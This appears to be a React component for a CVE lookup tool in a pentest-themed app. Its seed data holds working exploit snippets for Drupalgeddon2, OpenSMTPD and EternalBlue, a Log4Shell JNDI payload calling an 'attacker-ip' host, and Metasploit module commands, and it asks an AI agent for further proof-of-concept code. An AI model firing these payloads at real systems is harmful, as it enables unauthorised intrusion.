import React, { useState, useEffect } from 'react';
import { 
  Search, 
  ShieldAlert, 
  Terminal, 
  Copy, 
  Check, 
  ExternalLink, 
  Sparkles, 
  RefreshCw, 
  Save, 
  BookOpen, 
  AlertTriangle 
} from 'lucide-react';
import { soundEngine } from '../../../services/soundEffects';
import { api } from '../../../services/api';

interface CveHunterAppProps {
  windowId: string;
  isActive: boolean;
  onClose: () => void;
}

interface CveEntry {
  cve: string;
  name: string;
  cvss: string;
  affected: string;
  module: string;
  description: string;
  pocSnippet?: string;
}

const INITIAL_CVES: CveEntry[] = [
  {
    cve: 'CVE-2018-7600',
    name: 'Drupalgeddon2 Form API RCE',
    cvss: '9.8 CRITICAL',
    affected: 'Drupal 7.x (< 7.58), 8.x (< 8.5.1)',
    module: 'exploit/unix/webapp/drupal_drupalgeddon2',
    description: 'Unauthenticated remote code execution flaw in Drupal core AJAX/Form API via render arrays.',
    pocSnippet: 'curl -k -i http://target/drupal/?q=user/password --data-urlencode "form_id=user_pass" --data-urlencode "_triggering_element_name=name" --data-urlencode "name[#post_render][]=exec" --data-urlencode "name[#type]=markup" --data-urlencode "name[#markup]=whoami"'
  },
  {
    cve: 'CVE-2020-7247',
    name: 'OpenSMTPD Local / Remote Code Execution',
    cvss: '9.8 CRITICAL',
    affected: 'OpenSMTPD 6.6.1p1 and earlier',
    module: 'exploit/linux/smtp/opensmtpd_mail_from_rce',
    description: 'Improper input validation in OpenSMTPD allowing shell command execution via crafted MAIL FROM address.',
    pocSnippet: 'MAIL FROM:<root@target.lab>; exec /bin/sh -c "id > /tmp/pwned"'
  },
  {
    cve: 'MS17-010',
    name: 'EternalBlue SMB Remote Code Execution',
    cvss: '9.3 HIGH',
    affected: 'Windows Server 2008 / 2012 / 7',
    module: 'exploit/windows/smb/ms17_010_eternalblue',
    description: 'SMBv1 buffer overflow vulnerability allowing SYSTEM-level execution.',
    pocSnippet: 'use exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 192.168.100.50\nexploit'
  },
  {
    cve: 'CVE-2021-44228',
    name: 'Log4Shell Apache Log4j JNDI RCE',
    cvss: '10.0 CRITICAL',
    affected: 'Apache Log4j2 2.0-beta9 to 2.14.1',
    module: 'exploit/multi/http/log4shell_header_injection',
    description: 'JNDI injection through LDAP/RMI lookup leading to arbitrary code execution in Java applications.',
    pocSnippet: '${jndi:ldap://attacker-ip:1389/Exploit}'
  },
  {
    cve: 'WebDAV-PUT',
    name: 'Microsoft IIS WebDAV Arbitrary File Upload',
    cvss: '8.8 HIGH',
    affected: 'IIS 6.0 / 7.5 / 8.5 with active WebDAV',
    module: 'auxiliary/scanner/http/webdav_scanner',
    description: 'Misconfigured HTTP methods (PUT, MOVE) permitting direct upload and execution of ASP/ASPX web shells.',
    pocSnippet: 'davtest -url http://192.168.100.51/webdav/ -auth user:pass'
  }
];

export const CveHunterApp: React.FC<CveHunterAppProps> = () => {
  const [query, setQuery] = useState('');
  const [cves, setCves] = useState<CveEntry[]>(INITIAL_CVES);
  const [isSearchingAi, setIsSearchingAi] = useState(false);
  const [copiedId, setCopiedId] = useState<string | null>(null);
  const [savedId, setSavedId] = useState<string | null>(null);

  // Fetch latest CVE feed from backend on mount
  useEffect(() => {
    fetch('/api/scraper/news?spider=cve_feed')
      .then(res => res.json())
      .then(data => {
        if (data.success && data.items && data.items.length > 0) {
          const liveEntries: CveEntry[] = data.items.map((item: any, idx: number) => ({
            cve: item.title?.match(/CVE-\d{4}-\d+/i)?.[0] || `CVE-LIVE-${idx}`,
            name: item.title || 'Vulnerability Disclosure',
            cvss: item.cvss || 'HIGH',
            affected: item.affected || 'Multiple vendors',
            module: item.module || 'auxiliary/scanner/vulnerability',
            description: item.summary || item.text?.slice(0, 160) || 'Active threat advisory.',
            pocSnippet: item.url
          }));
          setCves(prev => [...liveEntries, ...prev]);
        }
      })
      .catch(console.error);
  }, []);

  const filtered = cves.filter(c => 
    c.cve.toLowerCase().includes(query.toLowerCase()) || 
    c.name.toLowerCase().includes(query.toLowerCase()) ||
    c.affected.toLowerCase().includes(query.toLowerCase()) ||
    c.description.toLowerCase().includes(query.toLowerCase())
  );

  const handleCopy = (cve: string, text: string) => {
    soundEngine.playClick();
    navigator.clipboard.writeText(text);
    setCopiedId(cve);
    setTimeout(() => setCopiedId(null), 2000);
  };

  const handleSearchAi = async () => {
    if (!query.trim() || isSearchingAi) return;
    soundEngine.playClick();
    setIsSearchingAi(true);

    try {
      const res = await fetch('/api/agents/chat', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          agentId: 'ares',
          message: `Lookup CVE details for: "${query}". Return JSON with keys: cve, name, cvss, affected, module, description, pocSnippet.`
        })
      });

      const data = await res.json();
      const reply = data.reply || '';

      // Parse JSON from reply if present, or create structured entry
      const jsonMatch = reply.match(/\{[\s\S]*\}/);
      if (jsonMatch) {
        try {
          const parsed = JSON.parse(jsonMatch[0]);
          const newEntry: CveEntry = {
            cve: parsed.cve || query.toUpperCase(),
            name: parsed.name || `${query} Advisory`,
            cvss: parsed.cvss || '9.0 CRITICAL',
            affected: parsed.affected || 'Unknown targets',
            module: parsed.module || 'exploit/multi/handler',
            description: parsed.description || reply.slice(0, 200),
            pocSnippet: parsed.pocSnippet || '# Proof of concept command'
          };
          setCves(prev => [newEntry, ...prev]);
          soundEngine.playCyberPing();
        } catch {
          // fallback
        }
      }
    } catch (e) {
      console.error(e);
    } finally {
      setIsSearchingAi(false);
    }
  };

  const handleSaveToVault = async (item: CveEntry) => {
    soundEngine.playClick();
    const markdown = `# Vulnerability Dossier: ${item.cve}
**Name**: ${item.name}  
**CVSS Score**: \`${item.cvss}\`  
**Affected Software**: ${item.affected}  
**Metasploit Module**: \`${item.module}\`  

## 🛡️ Technical Description
${item.description}

## 💣 Proof of Concept & Exploit Syntax
\`\`\`bash
${item.pocSnippet || `use ${item.module}\nshow options`}
\`\`\`
`;

    try {
      await api.saveNote(`Cyber/CVEs/${item.cve.replace(/[^a-zA-Z0-9_-]/g, '_')}.md`, markdown, {
        cve: item.cve,
        cvss: item.cvss,
        type: 'vulnerability-intel',
        tags: ['cve', 'exploit', 'pentest', 'ares']
      });
      setSavedId(item.cve);
      soundEngine.playCyberPing();
      setTimeout(() => setSavedId(null), 2500);
    } catch (e) {
      console.error(e);
    }
  };

  return (
    <div className="h-full min-h-0 flex flex-col p-4 bg-[#0a0710] text-zinc-200 font-sans select-text">
      {/* Search Header Bar */}
      <div className="flex items-center gap-2 pb-3 mb-2 border-b border-white/10 shrink-0">
        <div className="flex-1 flex items-center gap-2 px-3 py-2 rounded-xl bg-black/50 border border-white/10 focus-within:border-red-500/50">
          <Search className="w-4 h-4 text-red-400 shrink-0" />
          <input
            type="text"
            value={query}
            onChange={(e) => setQuery(e.target.value)}
            onKeyDown={(e) => e.key === 'Enter' && handleSearchAi()}
            placeholder="Search CVEs, Exploits, Metasploit modules, or enter a zero-day..."
            className="w-full bg-transparent text-xs text-white focus:outline-none font-mono"
          />
        </div>

        <button
          onClick={handleSearchAi}
          disabled={!query.trim() || isSearchingAi}
          className="flex items-center gap-1.5 px-4 py-2 rounded-xl bg-red-500/20 hover:bg-red-500/30 border border-red-500/40 text-red-300 font-mono font-bold text-xs transition-all shadow-[0_0_12px_rgba(239,68,68,0.2)] disabled:opacity-40 shrink-0"
        >
          {isSearchingAi ? <RefreshCw className="w-3.5 h-3.5 animate-spin" /> : <Sparkles className="w-3.5 h-3.5" />}
          <span>{isSearchingAi ? 'Querying Intel...' : 'Deep Intel Search'}</span>
        </button>
      </div>

      {/* CVE Feed Stream */}
      <div className="flex-1 min-h-0 overflow-y-auto space-y-2.5 pr-1 custom-scrollbar">
        {filtered.map((item) => (
          <div key={item.cve} className="p-3.5 rounded-2xl bg-white/5 border border-white/5 hover:border-red-500/40 transition-all">
            {/* Top Bar */}
            <div className="flex items-center justify-between mb-2">
              <div className="flex items-center gap-2">
                <ShieldAlert className="w-4 h-4 text-red-400 shrink-0" />
                <span className="font-mono text-xs font-bold text-white">{item.cve}</span>
                <span className="text-xs font-medium text-zinc-300 truncate max-w-sm">- {item.name}</span>
              </div>
              <div className="flex items-center gap-2">
                <span className={`text-[10px] px-2 py-0.5 rounded font-mono font-bold ${
                  item.cvss.includes('CRITICAL') ? 'bg-red-500/20 text-red-400 border border-red-500/30' :
                  item.cvss.includes('HIGH') ? 'bg-amber-500/20 text-amber-300 border border-amber-500/30' :
                  'bg-cyan-500/20 text-cyan-300'
                }`}>
                  {item.cvss}
                </span>

                <button
                  onClick={() => handleSaveToVault(item)}
                  className="px-2.5 py-1 rounded-lg bg-white/5 hover:bg-white/10 text-zinc-300 hover:text-white text-[10px] font-mono font-bold flex items-center gap-1 transition-colors"
                >
                  {savedId === item.cve ? <Check className="w-3 h-3 text-emerald-400" /> : <Save className="w-3 h-3" />}
                  <span>{savedId === item.cve ? 'Saved' : 'Save'}</span>
                </button>
              </div>
            </div>

            {/* Affected & Description */}
            <p className="text-xs text-zinc-300 leading-relaxed mb-2 font-sans">
              {item.description}
            </p>

            <div className="text-[11px] font-mono text-zinc-400 mb-2">
              <span>Target Version: <strong className="text-zinc-200">{item.affected}</strong></span>
            </div>

            {/* Metasploit Module Command Bar */}
            <div className="flex items-center justify-between p-2 rounded-xl bg-black/60 border border-white/10 font-mono text-[11px]">
              <div className="flex items-center gap-2 overflow-hidden">
                <Terminal className="w-3.5 h-3.5 text-red-400 shrink-0" />
                <span className="text-zinc-400 truncate">use {item.module}</span>
              </div>
              <button
                onClick={() => handleCopy(item.cve, `use ${item.module}`)}
                className="px-2 py-0.5 rounded bg-white/10 hover:bg-white/20 text-zinc-300 font-bold flex items-center gap-1 text-[10px] transition-colors shrink-0"
              >
                {copiedId === item.cve ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                <span>{copiedId === item.cve ? 'Copied' : 'Copy'}</span>
              </button>
            </div>
          </div>
        ))}
      </div>
    </div>
  );
};
